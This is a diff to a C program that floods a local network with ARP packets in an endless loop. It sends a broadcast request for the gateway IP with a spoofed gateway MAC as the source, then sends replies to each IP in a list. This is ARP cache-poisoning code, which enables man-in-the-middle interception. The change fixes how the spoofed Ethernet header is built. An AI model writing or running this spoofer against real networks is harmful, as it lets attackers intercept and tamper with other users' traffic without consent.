@@ -85,10 +85,12 @@ int main(int argc, char *argv[]) {
 
     // Endless loop: send gratuitous ARP request, then iterate over each IP in list, send replies, then sleep
     while (1) {
-        // --- Gratuitous ARP Request for gateway IP ---
+        // --- ARP Request for gateway IP ---
         {
-            struct ether_header garp_eh = eh;
+            struct ether_header garp_eh;
+            // Broadcast dest, spoofed gateway MAC as source
             memset(garp_eh.ether_dhost, 0xff, ETH_ALEN);
+            memcpy(garp_eh.ether_shost, src_mac,   ETH_ALEN);
             garp_eh.ether_type = htons(ETH_P_ARP);
 
             struct ether_arp garp_req = arp;
@@ -128,7 +130,6 @@ int main(int argc, char *argv[]) {
                 size_t frame_len = sizeof(buffer);  // 60
                 if (sendto(sock, buffer, frame_len, 0,
                            (struct sockaddr*)&sa, sizeof(sa)) < 0) {
-                    // handle error if needed
                 }
             }
             token = strtok(NULL, ",");
